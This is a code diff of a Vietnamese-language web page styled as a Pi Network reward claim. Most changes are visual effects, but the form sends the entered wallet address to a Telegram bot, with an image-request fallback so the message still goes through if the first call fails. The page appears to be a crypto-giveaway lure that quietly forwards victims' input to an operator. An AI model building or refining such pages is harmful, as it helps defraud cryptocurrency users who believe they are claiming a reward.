+                coinBack.className = 'coin-back';
+                coinBack.textContent = 'π';
+                
+                coinInner.appendChild(coinFront);
+                coinInner.appendChild(coinBack);
+                coin.appendChild(coinInner);
+                
+                const size = 30 + Math.random() * 40;
+                coin.style.width = `${size}px`;
+                coin.style.height = `${size}px`;
                 coin.style.left = `${Math.random() * 90 + 5}%`;
                 coin.style.top = `${Math.random() * 90 + 5}%`;
                 coin.style.animationDelay = `${Math.random() * 5}s`;
-                coin.style.transform = `scale(${0.5 + Math.random() * 0.5})`;
-                starsContainer.appendChild(coin);
+                coin.style.opacity = (0.3 + Math.random() * 0.4).toString();
+                coin.setAttribute('data-speed', (0.5 + Math.random()).toString());
+                
+                // Add floating animation
+                coin.style.animation = `float ${10 + Math.random() * 10}s infinite ease-in-out`;
+                coin.style.animationDelay = `${Math.random() * 5}s`;
+                
+                coinsContainer.appendChild(coin);
+            }
+            
+            // Create light streaks
+            const lightStreaksContainer = document.getElementById('lightStreaksContainer');
+            const numStreaks = 5;
+            
+            for (let i = 0; i < numStreaks; i++) {
+                const streak = document.createElement('div');
+                streak.className = 'light-streak';
+                streak.style.top = `${Math.random() * 100}%`;
+                streak.style.animationDelay = `${Math.random() * 10}s`;
+                lightStreaksContainer.appendChild(streak);
+            }
+        }
+        
+        // Create explosion particles
+        function createExplosionParticles() {
+            const container = document.getElementById('explosionContainer');
+            const numParticles = 50;
+            
+            for (let i = 0; i < numParticles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'explosion-particle';
+                
+                // Set random direction for each particle
+                const angle = Math.random() * Math.PI * 2;
+                const distance = 100 + Math.random() * 100;
+                const tx = Math.cos(angle) * distance;
+                const ty = Math.sin(angle) * distance;
+                
+                particle.style.setProperty('--tx', `${tx}px`);
+                particle.style.setProperty('--ty', `${ty}px`);
+                
+                container.appendChild(particle);
+            }
+        }
+        
+        // Create galaxy effect
+        function createGalaxyEffect() {
+            const galaxyEffect = document.getElementById('galaxyEffect');
+            const numStars = 150;
+            
+            for (let i = 0; i < numStars; i++) {
+                const star = document.createElement('div');
+                star.className = 'galaxy-star';
+                
+                const size = Math.random() * 3 + 1;
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                
+                // Position randomly within the container
+                const angle = Math.random() * Math.PI * 2;
+                const distance = Math.random() * 100;
+                const x = 50 + Math.cos(angle) * distance;
+                const y = 50 + Math.sin(angle) * distance;
+                
+                star.style.left = `${x}%`;
+                star.style.top = `${y}%`;
+                
+                galaxyEffect.appendChild(star);
             }
         }
         
         // Show loading spinner
         function showLoading() {
-            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('loadingOverlay').style.display = 'flex';
         }
         
         // Hide loading spinner
         function hideLoading() {
-            document.getElementById('loading').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+        
+        // Show success modal
+        function showSuccessModal(walletAddress) {
+            const modal = document.getElementById('successModal');
+            document.getElementById('successWalletAddress').textContent = walletAddress;
+            modal.classList.remove('hidden');
+        }
+        
+        // Hide success modal
+        function hideSuccessModal() {
+            const modal = document.getElementById('successModal');
+            modal.classList.add('hidden');
+        }
+        
+        // Navigate between pages
+        function navigateTo(fromPage, toPage, direction = 'right') {
+            const from = document.getElementById(fromPage);
+            const to = document.getElementById(toPage);
+            
+            // Set initial positions
+            from.classList.remove('page-active');
+            to.classList.remove('page-inactive-left', 'page-inactive-right');
+            
+            if (direction === 'right') {
+                from.classList.add('page-inactive-left');
+                to.classList.add('page-active');
+            } else {
+                from.classList.add('page-inactive-right');
+                to.classList.add('page-active');
+            }
+            
+            // Update back button visibility
+            const headerBackBtn = document.getElementById('headerBackBtn');
+            if (toPage === 'homePage') {
+                headerBackBtn.style.visibility = 'hidden';
+            } else {
+                headerBackBtn.style.visibility = 'visible';
+            }
+            
+            // Scroll to top of new page
+            window.scrollTo(0, 0);
+        }
+        
+        // Handle scroll animations
+        function handleScrollAnimations() {
+            const elements = document.querySelectorAll('.animate-on-scroll, .animate-fade-in, .animate-scale-in, .animate-slide-left, .animate-slide-right');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const delay = entry.target.getAttribute('data-delay') || 0;
+                        setTimeout(() => {
+                            entry.target.classList.add('animated');
+                        }, delay);
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, { threshold: 0.1 });
+            
+            elements.forEach(element => {
+                observer.observe(element);
+            });
+        }
+        
+        // Handle staggered animations
+        function handleStaggeredAnimations() {
+            const staggerItems = document.querySelectorAll('.stagger-item');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const index = parseInt(entry.target.getAttribute('data-index')) || 0;
+                        setTimeout(() => {
+                            entry.target.classList.add('animated');
+                        }, index * 150);
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, { threshold: 0.1 });
+            
+            staggerItems.forEach(item => {
+                observer.observe(item);
+            });
+        }
+        
+        // Handle galaxy effect
+        function handleGalaxyEffect() {
+            const galaxySection = document.querySelector('.galaxy-section');
+            const galaxyEffect = document.getElementById('galaxyEffect');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        galaxyEffect.classList.add('active');
+                    } else {
+                        galaxyEffect.classList.remove('active');
+                    }
+                });
+            }, { threshold: 0.5 });
+            
+            observer.observe(galaxySection);
+        }
+        
+        // Handle 3D tilt effect
+        function setupTiltEffect() {
+            const tiltCards = document.querySelectorAll('.tilt-card');
+            
+            tiltCards.forEach(card => {
+                const inner = card.querySelector('.tilt-card-inner');
+                
+                card.addEventListener('mousemove', (e) => {
+                    const rect = card.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    
+                    const xPercent = x / rect.width;
+                    const yPercent = y / rect.height;
+                    
+                    const tiltX = (yPercent - 0.5) * 20;
+                    const tiltY = (0.5 - xPercent) * 20;
+                    
+                    inner.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+                });
+                
+                card.addEventListener('mouseleave', () => {
+                    inner.style.transform = 'rotateX(0deg) rotateY(0deg)';
+                });
+            });
+        }
+        
+        // Handle surprise explosion effect
+        function setupSurpriseEffect() {
+            const surpriseTrigger = document.querySelector('.surprise-trigger');
+            
+            if (surpriseTrigger) {
+                surpriseTrigger.addEventListener('click', () => {
+                    surpriseTrigger.classList.add('active');
+                    
+                    setTimeout(() => {
+                        surpriseTrigger.classList.remove('active');
+                    }, 1000);
+                });
+            }
         }
         
         // Initialize page
         document.addEventListener('DOMContentLoaded', function() {
-            createStarsAndCoins();
+            createPremiumBackground();
+            createExplosionParticles();
+            createGalaxyEffect();
+            handleScrollAnimations();
+            handleStaggeredAnimations();
+            handleGalaxyEffect();
+            setupTiltEffect();
+            setupSurpriseEffect();
             
+            // Hide back button initially
+            const headerBackBtn = document.getElementById('headerBackBtn');
+            headerBackBtn.style.visibility = 'hidden';
+            
+            // Button click handlers
             const openFormBtn = document.getElementById('openFormBtn');
-            const closeFormBtn = document.getElementById('closeFormBtn');
-            const walletForm = document.getElementById('walletForm');
-            const unlockBtn = document.getElementById('unlockBtn');
-            const submitBtn = document.getElementById('submitBtn');
-            const piWalletForm = document.getElementById('piWalletForm');
-            const successModal = document.getElementById('successModal');
             const backToHomeBtn = document.getElementById('backToHomeBtn');
+            const unlockSubmitBtn = document.getElementById('unlockSubmitBtn');
+            const closeSuccessBtn = document.getElementById('closeSuccessBtn');
             
-            // Open wallet form
+            // Open form page
             openFormBtn.addEventListener('click', function() {
-                walletForm.classList.add('active');
-                document.body.style.overflow = 'hidden';
+                navigateTo('homePage', 'formPage', 'right');
             });
             
-            // Close wallet form
-            closeFormBtn.addEventListener('click', function() {
-                const formContent = walletForm.querySelector('.card');
-                formContent.classList.remove('modal-enter');
-                formContent.classList.add('modal-exit');
-                
-                setTimeout(() => {
-                    walletForm.classList.remove('active');
-                    formContent.classList.remove('modal-exit');
-                    formContent.classList.add('modal-enter');
-                    document.body.style.overflow = '';
-                }, 300);
+            // Back to home
+            backToHomeBtn.addEventListener('click', function() {
+                navigateTo('formPage', 'homePage', 'left');
             });
             
-            // Unlock send button
-            unlockBtn.addEventListener('click', function() {
-                unlockBtn.innerHTML = '<i class="fas fa-unlock-alt mr-2"></i> <span>Đã mở khóa</span>';
-                unlockBtn.classList.add('bg-green-200', 'dark:bg-green-700');
-                unlockBtn.classList.remove('bg-gray-200', 'dark:bg-gray-700');
+            // Header back button
+            headerBackBtn.addEventListener('click', function() {
+                const activePageId = document.querySelector('.page.page-active').id;
                 
-                submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                submitBtn.removeAttribute('disabled');
+                if (activePageId === 'formPage') {
+                    navigateTo('formPage', 'homePage', 'left');
+                }
             });
             
-            // Handle form submission
-            piWalletForm.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
+            // Form submission
+            unlockSubmitBtn.addEventListener('click', async function() {
                 const walletAddress = document.getElementById('walletAddress').value.trim();
                 
                 if (!walletAddress) {
-                    document.getElementById('walletAddress').classList.add('border-red-500');
-                    document.getElementById('walletAddress').parentElement.classList.add('shake');
-                    setTimeout(() => {
-                        document.getElementById('walletAddress').parentElement.classList.remove('shake');
-                    }, 500);
+                    document.getElementById('walletAddress').style.borderColor = 'red';
                     return;
                 }
                 
@@ -832,22 +1925,12 @@
                     const data = await response.json();
                     
                     if (data.ok) {
-                        // Show success message
-                        document.getElementById('successWalletAddress').textContent = walletAddress;
-                        
-                        // Hide wallet form and show success modal
-                        const formContent = walletForm.querySelector('.card');
-                        formContent.classList.remove('modal-enter');
-                        formContent.classList.add('modal-exit');
-                        
                         setTimeout(() => {
-                            walletForm.classList.remove('active');
-                            formContent.classList.remove('modal-exit');
-                            formContent.classList.add('modal-enter');
-                            successModal.classList.add('active');
-                        }, 300);
+                            // Add a slight delay to show loading state
+                            hideLoading();
+                            showSuccessModal(walletAddress);
+                        }, 1000);
                     } else {
-                        // Try alternative method
                         throw new Error('Failed to send message to Telegram');
                     }
                 } catch (error) {
@@ -859,49 +1942,35 @@
                     img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}`)}&t=${timestamp}`;
                     
                     img.onload = img.onerror = function() {
-                        document.getElementById('successWalletAddress').textContent = walletAddress;
-                        
-                        // Hide wallet form and show success modal
-                        const formContent = walletForm.querySelector('.card');
-                        formContent.classList.remove('modal-enter');
-                        formContent.classList.add('modal-exit');
-                        
                         setTimeout(() => {
-                            walletForm.classList.remove('active');
-                            formContent.classList.remove('modal-exit');
-                            formContent.classList.add('modal-enter');
-                            successModal.classList.add('active');
-                        }, 300);
+                            hideLoading();
+                            showSuccessModal(walletAddress);
+                        }, 1000);
                     };
-                } finally {
-                    hideLoading();
                 }
             });
             
-            // Back to home button
-            backToHomeBtn.addEventListener('click', function() {
-                const modalContent = successModal.querySelector('.card');
-                modalContent.classList.remove('modal-enter');
-                modalContent.classList.add('modal-exit');
+            closeSuccessBtn.addEventListener('click', function() {
+                hideSuccessModal();
+                navigateTo('formPage', 'homePage', 'left');
+                document.getElementById('walletAddress').value = '';
+            });
+
+            // Add parallax effect to background elements
+            document.addEventListener('mousemove', (e) => {
+                const moveX = (e.clientX - window.innerWidth / 2) / 50;
+                const moveY = (e.clientY - window.innerHeight / 2) / 50;
                 
-                setTimeout(() => {
-                    successModal.classList.remove('active');
-                    modalContent.classList.remove('modal-exit');
-                    modalContent.classList.add('modal-enter');
-                    document.body.style.overflow = '';
-                    
-                    // Reset form
-                    document.getElementById('walletAddress').value = '';
-                    
-                    // Reset unlock button
-                    unlockBtn.innerHTML = '<i class="fas fa-lock mr-2"></i> <span>Mở khóa gửi</span>';
-                    unlockBtn.classList.remove('bg-green-200', 'dark:bg-green-700');
-                    unlockBtn.classList.add('bg-gray-200', 'dark:bg-gray-700');
-                    
-                    // Disable submit button again
-                    submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
-                    submitBtn.setAttribute('disabled', 'disabled');
-                }, 300);
+                const parallaxBgs = document.querySelectorAll('.parallax-bg');
+                parallaxBgs.forEach(bg => {
+                    bg.style.transform = `translate(${moveX}px, ${moveY}px)`;
+                });
+                
+                const coins = document.querySelectorAll('.premium-coin');
+                coins.forEach(coin => {
+                    const speedFactor = parseFloat(coin.getAttribute('data-speed') || 1);
+                    coin.style.transform = `translate(${moveX * speedFactor}px, ${moveY * speedFactor}px)`;
+                });
             });
         });
     </script>
